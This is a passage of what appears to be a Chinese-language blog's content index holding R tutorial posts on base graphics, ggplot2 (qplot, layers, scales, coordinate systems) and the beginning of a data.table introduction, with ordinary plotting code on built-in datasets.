Plot&quot;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"直方图-Histograms\"><a href=\"#直方图-Histograms\" class=\"headerlink\" title=\"直方图(Histograms)\"></a>直方图(Histograms)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hist(vector,</span><br><span class=\"line\">    breaks=12, #组的数量</span><br><span class=\"line\">    col=&quot;red&quot;, #条形颜色</span><br><span class=\"line\">    xlab=&quot;Miles Per Gallon&quot;,</span><br><span class=\"line\">    main=&quot;Colored histogram with 12 bins&quot;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"核密度图-Kernal-density-plots\"><a href=\"#核密度图-Kernal-density-plots\" class=\"headerlink\" title=\"核密度图(Kernal density plots)\"></a>核密度图(Kernal density plots)</h3><p><code>plot(density(x))</code>,x是一个数值型向量</p>\n<p>使用<code>lines()</code>叠加：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hist(vector,freq=FALSE,breaks=12,col=&quot;red&quot;,xlab=&quot;Miles Per Gallon&quot;,main=&quot;Histogram, density curve&quot;)</span><br><span class=\"line\">lines(density(vector), col=&quot;blue&quot;, lwd=2)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"箱线图-盒状图-Box-plots\"><a href=\"#箱线图-盒状图-Box-plots\" class=\"headerlink\" title=\"箱线图/盒状图(Box plots)\"></a>箱线图/盒状图(Box plots)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boxplot(mtcars$mpg, main=&quot;Box plot&quot;,ylab=&quot;Miles per Gallon&quot;)</span><br></pre></td></tr></table></figure>\n<p>并列箱线图：<br>进行跨组比较，箱线图可以展示单个变量或分组变量。使用格式为:<code>boxplot(formula, data=dataframe)</code>，其中的formula是一个公式,dataframe代表提供数据的数据框(或列表)。一个示例公式为y~A,这将为类别型变量A的每个值并列地生成数值型变量y的箱线图。公式y~A*B则将为类别型变量A和B所有水平的两两组合生成数值型变量y的箱线图。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boxplot(mpg~cyl,data=mtcars,</span><br><span class=\"line\">main=&quot;Car Milage Data&quot;,</span><br><span class=\"line\">xlab=&quot;Number of Cylinders&quot;,</span><br><span class=\"line\">ylab=&quot;Miles Per Gallon&quot;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"点图-Dot-plots\"><a href=\"#点图-Dot-plots\" class=\"headerlink\" title=\"点图(Dot plots)\"></a>点图(Dot plots)</h3><p><code>dotchart(x,labels=)</code>,其中x是一个数值向量，而labels是由每个点标签组成的向量。例1：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dotchart(mtcars$mpg, labels=row.names(mtcars), cex=.7,</span><br><span class=\"line\">main=&quot;Gas Mileage for Car Models&quot;, xlab=&quot;Miles Per</span><br><span class=\"line\">Gallon&quot;)</span><br><span class=\"line\">#cex指定字符大小</span><br></pre></td></tr></table></figure></p>\n<p>例2：（分组 颜色 点图）<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">x &lt;- mtcars[order(mtcars$mpg),]</span><br><span class=\"line\">x$cyl &lt;- factor(x$cyl)</span><br><span class=\"line\">x$color[x$cyl==4] &lt;- &quot;red&quot;</span><br><span class=\"line\">x$color[x$cyl==6] &lt;- &quot;blue&quot;</span><br><span class=\"line\">x$color[x$cyl==8] &lt;- &quot;darkgreen&quot;</span><br><span class=\"line\">dotchart(x$mpg,</span><br><span class=\"line\">labels = row.names(x),</span><br><span class=\"line\">cex=.7,</span><br><span class=\"line\">pch=19,</span><br><span class=\"line\">groups = x$cyl,</span><br><span class=\"line\">gcolor = &quot;black&quot;,</span><br><span class=\"line\">color = x$color,</span><br><span class=\"line\">main = &quot;Gas Mileage for Car Models\\ngrouped by cylinder&quot;,</span><br><span class=\"line\">xlab = &quot;Miles Per Gallon&quot;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"散点图-Scatter-plots\"><a href=\"#散点图-Scatter-plots\" class=\"headerlink\" title=\"散点图(Scatter plots)\"></a>散点图(Scatter plots)</h3><p><code>plot(x,y)</code>，xy是数值型向量，代表(x,y)点</p>\n<p>例子：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#探究车重和单位油量行驶公里数的关系</span><br><span class=\"line\">attach(mtcars)</span><br><span class=\"line\">plot(wt, mpg,</span><br><span class=\"line\">main=&quot;Basic Scatterplot of MPG vs. Weight&quot;,</span><br><span class=\"line\">xlab=&quot;Car Weight (lbs/1000)&quot;,</span><br><span class=\"line\">ylab=&quot;Miles Per Gallon &quot;, pch=19)</span><br><span class=\"line\">abline(lm(mpg ~ wt), col=&quot;red&quot;, lwd=2, lty=1)</span><br><span class=\"line\">#abline()函数用来添加最佳拟合的线性直线</span><br><span class=\"line\">detach(mtcars)</span><br></pre></td></tr></table></figure></p>\n<p><code>pairs()</code>函数可以创建基础的散点图矩阵。<br>例：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pairs(~ mpg + disp + drat + wt, data=mtcars,</span><br><span class=\"line\">main=&quot;Basic Scatterplot Matrix&quot;)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">install.packages(&quot;car&quot;)</span><br><span class=\"line\">library(car)</span><br><span class=\"line\">scatterplotMatrix(~ mpg + disp + drat + wt,</span><br><span class=\"line\">data=mtcars, spread=FALSE,</span><br><span class=\"line\">smoother.args=list(lty=2), main=&quot;Scatter Plot</span><br><span class=\"line\">Matrix via car Package&quot;)</span><br></pre></td></tr></table></figure>\n<p>线性和平滑拟合曲线被默认添加,主对角线处添加了核密度曲线和轴须图。<code>spread = FALSE</code>选项表示不添加展示分散度和对称信息的直线,<code>lty.smooth =2</code>设定平滑(loess)拟合曲线使用虚线而不是实线。</p>\n<h3 id=\"马赛克图-Mosaic-plots\"><a href=\"#马赛克图-Mosaic-plots\" class=\"headerlink\" title=\"马赛克图(Mosaic plots)\"></a>马赛克图(Mosaic plots)</h3><p>马赛克图用于可视化两个以上的类别型变量(只观察单个类别型变量,可以使用柱状图或者饼图)<br><code>mosaic(table)</code></p>\n","categories":["R语言学习"],"tags":["R语言"]},{"title":"R语言学习（五）ggplot2","url":"/2018/10/31/R%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89ggplot/","content":"<blockquote>\n<p>ggplot2是R语言中比较新的一个包，核心理念是将绘图与数据分离，数据相关的绘图与数据无关的绘图分离，按图层作图，保有命令式作图的调整函数，使其更具灵活性，将常见的统计变换融入到了绘图中</p>\n</blockquote>\n<h2 id=\"安装与使用\"><a href=\"#安装与使用\" class=\"headerlink\" title=\"安装与使用\"></a>安装与使用</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">install.packages(&quot;ggplot2&quot;)</span><br><span class=\"line\">library(ggplot2)</span><br></pre></td></tr></table></figure>\n<h2 id=\"qplot入门\"><a href=\"#qplot入门\" class=\"headerlink\" title=\"qplot入门\"></a>qplot入门</h2><p>数据集选取：diamonds</p>\n<p>例：钻石价格和重量的关系<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(carat, price, data = diamonds)</span><br><span class=\"line\">qplot(log(carat), log(price), data = diamonds) #曲线性</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h3 id=\"颜色，大小，形状属性\"><a href=\"#颜色，大小，形状属性\" class=\"headerlink\" title=\"颜色，大小，形状属性\"></a>颜色，大小，形状属性</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(carat, price, data = dsmall, colour = color)</span><br><span class=\"line\">qplot(carat, price, data = dsmall, shape = cut)</span><br></pre></td></tr></table></figure>\n<p><img src=\"Screenshot_20181030_210932.png\" alt=\"Screenshot_20181030_210932.png\"></p>\n<p>alpha用来创建半透明的颜色，其取值从0（完全透明）到1（完全不透明）<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(carat, price, data = diamonds, alpha = I(1/10))</span><br><span class=\"line\">qplot(carat, price, data = diamonds, alpha = I(1/100))</span><br><span class=\"line\">qplot(carat, price, data = diamonds, alpha = I(1/200))</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot_20181030_211435.png\" alt=\"Screenshot_20181030_211435.png\"></p>\n<h3 id=\"几何对象geom\"><a href=\"#几何对象geom\" class=\"headerlink\" title=\"几何对象geom\"></a>几何对象geom</h3><p>通过设置几何对象，qplot几乎可以画出任何一种图形</p>\n<ul>\n<li>geom = “point” 散点图（默认选项）</li>\n<li>geom = “smooth” 拟合平滑曲线</li>\n<li>geom = “boxplot” 箱线图</li>\n<li>geom = “path” 或 geom = “line” 数据点间绘制连线</li>\n</ul>\n<p>对于一维的分布，geom的选择由变量类型指定</p>\n<ul>\n<li>连续变量<ul>\n<li>geom = “histogram” 直方图（一维数据默认选项）</li>\n<li>geom = “freqpoly” 频率多边形</li>\n<li>geom = “density” 密度曲线</li>\n</ul>\n</li>\n<li>离散变量<ul>\n<li>geom = “bar” 条形图</li>\n</ul>\n</li>\n</ul>\n<p>如果在散点图中有非常多的数据点，那么数据展示的趋势可能并不明显。在这种情况下应该在图中添加一条平滑曲线。利用c()将多个几何对象组成一个向量传递给geom。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(carat, price, data = dsmall, geom = c(&quot;point&quot;,&quot;smooth&quot;)) #采样数据集</span><br><span class=\"line\">qplot(carat, price, data = diamonds, geom = c(&quot;point&quot;,&quot;smooth&quot;)) #完整数据集</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot_20181030_212340.png\" alt=\"Screenshot_20181030_212340.png\"></p>\n<p>箱线图和扰动图<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(color, price / carat, data = diamonds, geom = &quot;jitter&quot;) #扰动点图</span><br><span class=\"line\">qplot(color, price / carat, data = diamonds, geom = &quot;boxplot&quot;) #箱线图</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot_20181030_212633.png\" alt=\"Screenshot_20181030_212633.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(carat, data = diamonds, geom = &quot;histogram&quot;) #直方图</span><br><span class=\"line\">qplot(carat, data = diamonds, geom = &quot;density&quot;) #密度曲线</span><br></pre></td></tr></table></figure>\n<p><img src=\"Screenshot_20181030_214055.png\" alt=\"Screenshot_20181030_214055.png\"></p>\n<ul>\n<li>对于密度曲线图，adjust参数控制曲线平滑程度（取值越大越平滑）。</li>\n<li>对于直方图，通过binwidth参数设定组距来调节平滑度。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(carat, data = diamonds, geom = &quot;histogram&quot;,binwidth = 1, xlim = c(0,3)) #横坐标只显示0到3</span><br><span class=\"line\">qplot(carat, data = diamonds, geom = &quot;histogram&quot;,binwidth = 0.1, xlim = c(0,3))</span><br><span class=\"line\">qplot(carat, data = diamonds, geom = &quot;histogram&quot;,binwidth = 0.01, xlim = c(0,3))</span><br></pre></td></tr></table></figure>\n<p><img src=\"Screenshot_20181030_215301.png\" alt=\"Screenshot_20181030_215301.png\"></p>\n<p>要在不同分组之间对分布进行对比，只需再加上一个图形映射（aesthetic mapping）<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(carat, data = diamonds, geom = &quot;density&quot;,colour = color)</span><br><span class=\"line\">qplot(carat, data = diamonds, geom =&quot;histogram&quot;, fill = color)</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot_20181030_222230.png\" alt=\"Screenshot_20181030_222230.png\"></p>\n<p>如果数据已经进行了汇总，或者想用其他方式对数据进行分组处理，那么可以使用weight几何对象。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(color, data = diamonds, geom = &quot;bar&quot;) #下例是按重量加权的条形图；纵坐标改为crart</span><br><span class=\"line\">qplot(color, data = diamonds, geom = &quot;bar&quot;,weight = carat) + scale_y_continuous(&quot;carat&quot;)</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot_20181030_222518.png\" alt=\"Screenshot_20181030_222518.png\"></p>\n<p>线条图和路径图常用于可视化时间序列数据。</p>\n<ul>\n<li>线条图的x轴一般是时间，它展示了单个变量随时间变化的情况。<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(date, unemploy / pop, data = economics,geom = &quot;line&quot;) #失业比例</span><br><span class=\"line\">qplot(date, uempmed, data = economics, geom = &quot;line&quot;) #失业时间（星期数）中位数</span><br></pre></td></tr></table></figure>\n<img src=\"Screenshot_20181030_225421.png\" alt=\"Screenshot_20181030_225421.png\"></li>\n<li>路径图展示了两个变量随时间联动的情况，时间反映在点的顺序上。<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">year &lt;- function(x) as.POSIXlt(x)$year + 1900</span><br><span class=\"line\">qplot(unemploy / pop, uempmed, data = economics, geom = &quot;path&quot;, colour = year(date))</span><br></pre></td></tr></table></figure>\n<img src=\"Screenshot_20181030_225524.png\" alt=\"Screenshot_20181030_225524.png\"></li>\n</ul>\n<h3 id=\"分面\"><a href=\"#分面\" class=\"headerlink\" title=\"分面\"></a>分面</h3><p>除了利用颜色和形状来比较不同分组，还可以用分面：将数据分割成若干子集，然<br>后创建一个图形的矩阵。</p>\n<p><code>qplot()</code>默认的分面方法是拆分成若干个窗格，通过形如<code>facets = row-var ~ col_var</code>的表达式进行指定。如果只想指定一行或一列，可以使用<code>.</code>作为占位符，例<code>row-var ~ .</code>会创建一个单列多行的图形矩阵。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#针对属性color，创建单列多行分面</span><br><span class=\"line\">qplot(carat, data = diamonds, facets = color ~ .,geom = &quot;histogram&quot;, binwidth = 0.1, xlim = c(0, 3))</span><br><span class=\"line\"></span><br><span class=\"line\">#..density..表示将密度（density: p就roportions of the whole）而不是频数映射到y轴。使用密度可以使得比较不同组的分布时不会受该组样本量大小的影响。</span><br><span class=\"line\">qplot(carat, ..density.., data = diamonds, facets = color ~ ., geom = &quot;histogram&quot;, binwidth = 0.1, xlim = c(0, 3))</span><br></pre></td></tr></table></figure>\n<h3 id=\"其他选项\"><a href=\"#其他选项\" class=\"headerlink\" title=\"其他选项\"></a>其他选项</h3><ul>\n<li>xlim, ylim：设置x轴和y轴的显示区间，例如，xlim=c(0, 20) 和 ylim=c(-0.9,-0.5)</li>\n<li>log：log=”x” 表示对x轴取对数；log=”xy”表示对x轴和y轴都取对数。</li>\n<li>main：图形主标题。可以是字符串也可以是数学表达式。</li>\n<li>xlab, ylab：设置x和y轴的标签文字，可以是字符串或数学表达式。</li>\n</ul>\n<h2 id=\"图层语法\"><a href=\"#图层语法\" class=\"headerlink\" title=\"图层语法\"></a>图层语法</h2><p>散点图中，每个观测的数据都用一个点来表示。每个点的属性有横坐标、纵坐标、大小、颜色、形状，这些属性称之为图形属性（aesthetics，直译为“美学”）</p>\n<p>图层语法（layered grammar)将一张图定义为以下组件的组合：</p>\n<ul>\n<li>一个默认数据集和一组从变量到图形属性（aesthetics）的映射。</li>\n<li>一个或多个图层。每个图层都由一个几何对象、一个统计转换、一个位置调整，以及一个可选的从变量到图形属性的映射。</li>\n<li>一个标度：每个图形属性映射都对应一个标度。</li>\n<li>一个坐标系统。</li>\n<li><p>分面设定。</p>\n</li>\n<li><p>从数据单位（如英里每加仑、汽缸数）转换成电脑可以识别的物理单位（如像素和颜色），这个转换过程称之为标度变换（scaling）。</p>\n</li>\n<li>根据点的位置（x和y）来确定它在图中的位置，是由坐标系统决定的，被称作coord。</li>\n</ul>\n<h3 id=\"增加组件\"><a href=\"#增加组件\" class=\"headerlink\" title=\"增加组件\"></a>增加组件</h3><p>增加组件的例子：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(displ, hwy, data=mpg, facets = . ~ year) + geom_smooth()</span><br></pre></td></tr></table></figure><br>先分面，再添加一个平滑曲线</p>\n<h3 id=\"图层\"><a href=\"#图层\" class=\"headerlink\" title=\"图层\"></a>图层</h3><p>图层的作用是在图上生成我们能理解的对象。<br>一个图层由四部分组成：</p>\n<ul>\n<li>数据和图形属性的映射</li>\n<li>统计转换</li>\n<li>一种几何对象</li>\n<li>一个位置调整（即一种位置调整的方式）</li>\n</ul>\n<h3 id=\"标度\"><a href=\"#标度\" class=\"headerlink\" title=\"标度\"></a>标度</h3><ul>\n<li>标度控制数据到图形属性的映射。图上每一个图形属性都对应着一个标度。</li>\n<li>每个标度都作用于图中所有的数据，以确保数据到图形属性映射的一致性。</li>\n<li>图为四种不同scales的图例。<br><img src=\"Screenshot_20181031_155121.png\" alt=\"Screenshot_20181031_155121.png\"><br>一个标度就是含有一组参数的函数。其逆函数被用来绘制参照对象，通过参照对象你才能读出图中的隐含信息。参照对象可以是坐标轴（位置标度），或者是图例</li>\n</ul>\n<h3 id=\"坐标系\"><a href=\"#坐标系\" class=\"headerlink\" title=\"坐标系\"></a>坐标系</h3><p>坐标系（coordinate system）简称为coord，用于将对象的位置映射到图形的平面上。</p>\n<ul>\n<li>位置通常由两个坐标(x,y)决定，三维及以上尚未在ggplot2中实现。</li>\n<li>笛卡尔坐标系是最常用的二维坐标系，极坐标系和地图投影用的相对较少。<br><img src=\"Screenshot_20181031_155325.png\" alt=\"Screenshot_20181031_155325.png\"></li>\n</ul>\n<h3 id=\"绘图方式\"><a href=\"#绘图方式\" class=\"headerlink\" title=\"绘图方式\"></a>绘图方式</h3><p>绘图有两种方式</p>\n<ul>\n<li>一步到位式：利用<code>qplot()</code></li>\n<li><p>利用<code>ggplot()</code>函数和图层函数逐步作图。</p>\n<ul>\n<li><code>print()</code> 将图形呈现到屏幕上。</li>\n<li><code>ggsave()</code> 将图形保存在磁盘上。</li>\n<li><code>summary()</code> 简单查看图形的结构。</li>\n<li>首先给出图形的默认设置，然后给出每个图层的信息。</li>\n<li><p><code>save()</code> 把图形的缓存副本（一个图形对象的完整副本）保存到磁盘，稍后可用<code>load()</code>来重现该图。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p &lt;- qplot(displ, hwy, data = mpg, colour = factor(cyl))</span><br><span class=\"line\">summary(p) # Save plot object to disk</span><br><span class=\"line\">save(p, file = &quot;plot.rdata&quot;)</span><br><span class=\"line\">rm(p) #删除p</span><br><span class=\"line\"># Load from disk</span><br><span class=\"line\">load(&quot;plot.rdata&quot;)</span><br><span class=\"line\">print(p)</span><br><span class=\"line\"># Save png to disk</span><br><span class=\"line\">ggsave(&quot;plot.png&quot;, width = 5, height = 5)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"用图层构建对象\"><a href=\"#用图层构建对象\" class=\"headerlink\" title=\"用图层构建对象\"></a>用图层构建对象</h2><p><code>qplot()</code>只能只用一个数据集来做图形映射，为了解决这个问题，需要引入图层。</p>\n</li>\n</ul>\n<p><code>qplot()</code>使用了很多默认的参数，如果要手动绘图，则需要使用<code>ggplot()</code>，<code>ggplot()</code>函数中包含了两个主要参数：数据和图形属性映射。数据是data.frame或者data.table，图形属性的设定类似<code>qplot()</code>，包含在一个<code>aes()</code>函数里<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p &lt;- ggplot(diamonds, aes(carat, price, colour = cut)) #此时显示的图还是空，需要设立几何对象</span><br><span class=\"line\">p &lt;- p + layer(geom =&quot;point&quot;,stat=&quot;identity&quot;,position=&quot;identity&quot;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"图层参数\"><a href=\"#图层参数\" class=\"headerlink\" title=\"图层参数\"></a>图层参数</h3><p>图层的设立参数有：<code>layer(geom, params, stat, data, mapping, position)</code><br>例：<code>ggplot()</code>绘制条形图：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p &lt;- ggplot(diamonds, aes(x = carat))</span><br><span class=\"line\">p &lt;- p + layer(</span><br><span class=\"line\">    geom = &quot;bar&quot;,</span><br><span class=\"line\">    params = list(fill = &quot;steelblue&quot;, binwidth = 2),</span><br><span class=\"line\">    stat = &quot;bin&quot;,</span><br><span class=\"line\">    position=&quot;identity&quot;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"快捷函数（short-cut）\"><a href=\"#快捷函数（short-cut）\" class=\"headerlink\" title=\"快捷函数（short cut）\"></a>快捷函数（short cut）</h3><p>图层的参数设定细致但过于繁琐。可以用快捷函数（shortcut)来简化之前的代码。</p>\n<ul>\n<li>每一个几何对象都对应一个默认的统计变换和位置参数，而每一个统计变换都对应着一个默认的几何对象参数，所以对于一个图层我们只需设定stat或geom参数即可。</li>\n<li>上页图可用以下代码生成：<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p+geom_histogram(binwidth = 2, fill = &quot;steelblue&quot;)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>所有的快捷函数都有相同的形式：以geom或stat开头。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">geom_XXX(mapping, data, ..., geom, position) – stat_XXX(mapping, data, ..., stat, position)</span><br></pre></td></tr></table></figure><br>参数：</p>\n<ul>\n<li>mapping：图形属性映射，通过aes()设定。</li>\n<li>data：可以修改默认数据集</li>\n<li>geom或stat参数，如上例中的<code>binwidth = 2, fill = &quot;steelblue&quot;</code> </li>\n<li>position：选择一种调整对象重合的方式。</li>\n</ul>\n<h3 id=\"从qplot-到ggplot\"><a href=\"#从qplot-到ggplot\" class=\"headerlink\" title=\"从qplot()到ggplot()\"></a>从qplot()到ggplot()</h3><p>例一：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(sleep_rem / sleep_total, awake, data = msleep)</span><br><span class=\"line\">#等价于</span><br><span class=\"line\">ggplot(msleep, aes(sleep_rem / sleep_total, awake)) + geom_point()</span><br></pre></td></tr></table></figure><br>例二，也可以给qplot加图层:：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">qplot(sleep_rem / sleep_total, awake, data = msleep) + geom_smooth()</span><br><span class=\"line\">#等价于</span><br><span class=\"line\">ggplot(msleep, aes(sleep_rem / sleep_total, awake)) + geom_point() + geom_smooth()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"图形变量\"><a href=\"#图形变量\" class=\"headerlink\" title=\"图形变量\"></a>图形变量</h3><p>图形对象可以存储到一个变量里。<code>summary()</code>可以查看图形的结构。首先给出图形的默认设置，然后给出每个图层的信息。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p &lt;- ggplot(msleep, aes(sleep_rem / sleep_total,awake))</span><br><span class=\"line\">summary(p)</span><br><span class=\"line\">p &lt;- p + geom_point()</span><br><span class=\"line\">summary(p)</span><br></pre></td></tr></table></figure><br>+运算符可以看作图层叠加计算</p>\n<p>同时，图层函数<code>geom_XXX()</code>也可以作为变量存储</p>\n<h3 id=\"图和图层\"><a href=\"#图和图层\" class=\"headerlink\" title=\"图和图层\"></a>图和图层</h3><p>默认的图形属性映射可以在图形对象初始化时设定，或者之后用“+”修改。<br>例：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p &lt;- ggplot(mtcars, aes(x = mpg, y = wt))</span><br><span class=\"line\">p + geom_point() – p + geom_point(aes(colour = factor(cyl))) #用factor(cyl)修改颜色</span><br><span class=\"line\">p + geom_point(aes(y = disp)) #用disp修改y坐标值</span><br></pre></td></tr></table></figure><br>aes的修改是叠加的，直接对新变量赋值会增加aes属性，对已有属性赋值会修改属性，赋NULL会删除属性</p>\n<h3 id=\"分组\"><a href=\"#分组\" class=\"headerlink\" title=\"分组\"></a>分组</h3><p>所有离散型变量的交互作用被设计为分组的默认值。但如果没能正确分组或图中没有离散型变量，就需要自定义分组结构。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">library(nlme)</span><br><span class=\"line\">qplot(age, height, data=Oxboys, group = Subject,geom=&quot;line&quot;) #指定Subject（每个男孩）为分组标量，每条线对应一个男孩。</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"匹配图形属性和图形对象-7-3\"><a href=\"#匹配图形属性和图形对象-7-3\" class=\"headerlink\" title=\"匹配图形属性和图形对象*7.3\"></a>匹配图形属性和图形对象*7.3</h3><p>对于连续型变量，如果希望线段平稳地从一种图形属性变换到另一种图形属性，可以使用线性插值法。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">xgrid &lt;- with(df, seq(min(x), max(x), length = 50))</span><br><span class=\"line\">interp &lt;- data.frame(</span><br><span class=\"line\">x = xgrid,</span><br><span class=\"line\">y = approx(df$x, df$y, xout = xgrid)$y,</span><br><span class=\"line\">colour = approx(df$x, df$colour, xout = xgrid)$y</span><br><span class=\"line\">)</span><br><span class=\"line\">qplot(x, y, data = df, colour = colour, size = I(5)) + geom_line(data =</span><br><span class=\"line\">interp, size = 2)</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot_20181031_191747.png\" alt=\"Screenshot_20181031_191747.png\"></p>\n<h2 id=\"工具箱\"><a href=\"#工具箱\" class=\"headerlink\" title=\"工具箱\"></a>工具箱</h2><h3 id=\"图层叠加策略\"><a href=\"#图层叠加策略\" class=\"headerlink\" title=\"图层叠加策略\"></a>图层叠加策略</h3><p>图层有三种：</p>\n<ol>\n<li>用于展示数据本身（data）。<ul>\n<li>辨识数据的整体结构、局部结构、离群点。</li>\n<li>在数据探索的初始阶段，本层通常是唯一的图层。</li>\n</ul>\n</li>\n<li>用于展示数据的统计摘要（summary）<ul>\n<li>用于展示模型的预测效果。</li>\n<li>绘制在数据层之上。</li>\n</ul>\n</li>\n<li>用以添加额外的元数据（metadata）、上下文信息和注解<ul>\n<li>元数据层展示背景上下文，帮助我们理解原始数据。元数据既可以作为前景也可以作为背景。地图经常作为空间数据的背景层。背景元数据不应影响主数据展示，因此它往往被放置在主<br>数据下层，配色不能突出，“想看就看看到，不想看就看不到”</li>\n<li>元数据也可以用来强调数据中的重要特征，比如为离群点加上解释性的标签。这时元数据图层是最后绘制的图层。</li>\n</ul>\n</li>\n</ol>\n<p>*7.4未完待续</p>\n<h2 id=\"标度，坐标轴和图例\"><a href=\"#标度，坐标轴和图例\" class=\"headerlink\" title=\"标度，坐标轴和图例\"></a>标度，坐标轴和图例</h2><ul>\n<li>标度（scale）控制着数据到图形属性的映射。标度将数据转化为视觉上可以感知的东西：大小、颜色、位置、形状。</li>\n<li>标度也提供了读图时所使用的工具：坐标轴和图例，它们称为引导元素（用于允许读者从图形属性空间到数据空间进行反向映射）。</li>\n<li>每一种标度都是从数据空间的某个区域（标度的定义域）到图形属性的某个区域（标度的值域）的一个函数</li>\n</ul>\n<p>执行标度的过程分三步：变换（transform）、训练（training）、映射（mapping）。</p>\n<ul>\n<li>图形中的每一个图形属性都需要一个标度。</li>\n<li>通常ggplot2将自动添加一个默认的标度。</li>\n<li>标度分四类：位置标度、颜色标度、手动离散型标度、同一型标度。</li>\n</ul>\n<p>例：改变标度<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p &lt;- qplot(sleep_total, sleep_cycle, data = msleep, colour = vore) #左上图 </span><br><span class=\"line\">p + scale_colour_hue() #右上图，显式添加默认标度，跟左上图一样  </span><br><span class=\"line\">p + scale_colour_hue(&quot;What does\\nit eat?&quot;, breaks = c(&quot;herbi&quot;, &quot;carni&quot;, &quot;omni&quot;, NA), labels = c(&quot;plants&quot;, &quot;meat&quot;, &quot;both&quot;, &quot;don&#x27;t know&quot;)) #左下图： 修改了默认标度的参数：改变 了图例的外观。</span><br><span class=\"line\">p + scale_colour_brewer(palette= &quot;Set1&quot;) #右下图：使用了不同的标度：改变了点的颜色</span><br></pre></td></tr></table></figure><br><img src=\"Screenshot_20181031_193230.png\" alt=\"Screenshot_20181031_193230.png\"></p>\n<p>*7.5未完待续</p>\n<h2 id=\"定位\"><a href=\"#定位\" class=\"headerlink\" title=\"定位\"></a>定位</h2>","categories":["R语言学习"],"tags":["R语言"]},{"title":"R语言学习（四）data.table","url":"/2018/10/08/R%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89data-table/","content":"<blockquote>\n<p>data.table是对R的原生包data.table的扩展版本，无论是编码效率和执行效率都要比data.table快的多</p>\n</blockquote>\n<p>在本章中:<br> – subset特指对行的选择<br> – select特指对列的选择</p>\n<h2 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DT &lt;- data.table(ID = c(&quot;b&quot;,&quot;b&quot;,&quot;b&quot;,&quot;a&quot;,&quot;a&quot;,&quot;c&quot;), A = 1:6, B = 7:12,C=13:18)</span><br></pre></td></tr></table></figure>\n<p>可见data.table的创建和data.frame类似，都是传入若干个向量，不同的是，data.frame中的character类型向量会自动转化为factor,data.table则不会，使用<code>class(DT$ID)</code>查看该属性的类型，返回”character”</p>\n<p>也可以根据已有的data.frame类型直接转化为data.table：A是data.frame类型<br><figure class=\"highlight plaintext\"><table><tr><td 